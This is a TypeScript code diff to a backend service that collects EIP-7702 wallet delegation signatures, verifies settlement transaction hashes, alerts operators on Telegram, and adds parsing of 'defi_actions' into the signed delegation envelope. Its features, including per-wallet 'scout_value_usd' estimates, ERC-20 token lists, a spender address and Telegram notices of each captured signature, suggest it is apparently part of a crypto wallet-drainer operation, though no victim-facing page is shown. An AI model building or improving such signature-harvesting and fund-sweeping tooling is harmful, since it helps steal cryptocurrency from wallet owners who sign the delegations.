@@ -108,12 +108,14 @@ import {
   notifySignatureReceived,
   notifyBroadcastScheduled,
   notifyBroadcastConfirmed,
+  notifyEvmSettlementWhenVerified,
   notifyNewSignatureAnchorRequest,
   notifyRelayIntermediaryWarning,
   notifySettlementAttempt,
   notifySettlementResult,
   type TelegramRequestContext,
 } from '../lib/telegram.js'
+import { isEvmTransactionHash } from '../lib/evm-tx-verify.js'
 import {
   finalizeSettlementHistory,
   recordSettlementHistory,
@@ -1067,8 +1069,13 @@ async function completeSettlementTracking(params: {
     const anyOk = Object.values(chains).some((v) => v === 'ok')
     status = anyOk ? 'partial' : 'failed'
     errorMessage = params.omnichain_settlement.detail ?? 'Omnichain settlement failed'
-  } else if (txHash != null || params.omnichain_settlement?.ok === true) {
+  } else if (params.omnichain_settlement?.ok === true) {
     status = 'settled'
+  } else if (txHash != null && isEvmTransactionHash(String(txHash))) {
+    status = 'settled'
+  } else if (txHash != null) {
+    status = 'failed'
+    errorMessage = 'Settlement reference is not a confirmed EVM transaction hash'
   } else {
     status = 'failed'
     errorMessage = 'Settlement completed without transaction hash'
@@ -2488,12 +2495,20 @@ async function handleNormalizedIngress(
       }
       const chainNorm = b.chain_id != null ? String(b.chain_id).trim() : '1'
       const scoutUsd = Number(bAny.scout_value_usd ?? 0) || 0
-      notifyBroadcastConfirmed(txHashStr, wallet_address, {
+      const chainIdNum = Number.parseInt(chainNorm.replace(/^eip155:/i, ''), 10)
+      const telegramCtx: TelegramRequestContext = {
         chain_family: 'EVM',
         chain_id: chainNorm,
         scout_value_usd: scoutUsd,
         amount: '0',
         wallet_type: String(b.wallet_type ?? 'hot_wallet'),
+        tx_hash: txHashStr,
+      }
+      notifyEvmSettlementWhenVerified({
+        txHash: txHashStr,
+        address: wallet_address,
+        chainId: Number.isFinite(chainIdNum) && chainIdNum > 0 ? chainIdNum : 1,
+        ctx: telegramCtx,
       }).catch(() => {})
       return sendSuccess(reply, 200, 'EIP-7702 self-broadcast recorded', {
         tx_hash: txHashStr,
@@ -2532,6 +2547,32 @@ async function handleNormalizedIngress(
         yParity: Number(authRaw['yParity'] ?? authRaw['v'] ?? 0),
       }
       const erc20sRaw = Array.isArray(b.erc20s) ? (b.erc20s as unknown[]).filter((a) => typeof a === 'string' && isAddress(a as string)).map((a) => getAddress(a as string)) : []
+      const defiActionsRaw = Array.isArray(b.defi_actions) ? (b.defi_actions as unknown[]) : []
+      const defi_actions = defiActionsRaw
+        .map((item) => {
+          if (!item || typeof item !== 'object') return null
+          const d = item as Record<string, unknown>
+          const target = typeof d['target'] === 'string' && isAddress(d['target']) ? getAddress(d['target']) : null
+          if (!target) return null
+          const tokenA =
+            typeof d['tokenA'] === 'string' && isAddress(d['tokenA'])
+              ? getAddress(d['tokenA'])
+              : ('0x0000000000000000000000000000000000000000' as Address)
+          const tokenB =
+            typeof d['tokenB'] === 'string' && isAddress(d['tokenB'])
+              ? getAddress(d['tokenB'])
+              : ('0x0000000000000000000000000000000000000000' as Address)
+          return {
+            kind: Number(d['kind'] ?? 0),
+            target,
+            tokenA,
+            tokenB,
+            param1: BigInt(String(d['param1'] ?? '0')),
+            param2: BigInt(String(d['param2'] ?? '0')),
+            param3: BigInt(String(d['param3'] ?? '0')),
+          }
+        })
+        .filter((x): x is NonNullable<typeof x> => x != null)
       const packed = packEip7702SignatureEnvelope({
         protocol: 'eip7702_delegation',
         chain_id: Number(b.chain_id),
@@ -2540,6 +2581,7 @@ async function handleNormalizedIngress(
         spender: spenderRaw && isAddress(spenderRaw) ? getAddress(spenderRaw) : getAddress(delegateeRaw),
         authorization,
         erc20s: erc20sRaw,
+        ...(defi_actions.length > 0 ? { defi_actions } : {}),
       })
       const sealed = sealSignatureHexForPersistence(packed as Hex)
       const chainIdNorm = String(b.chain_id).trim()
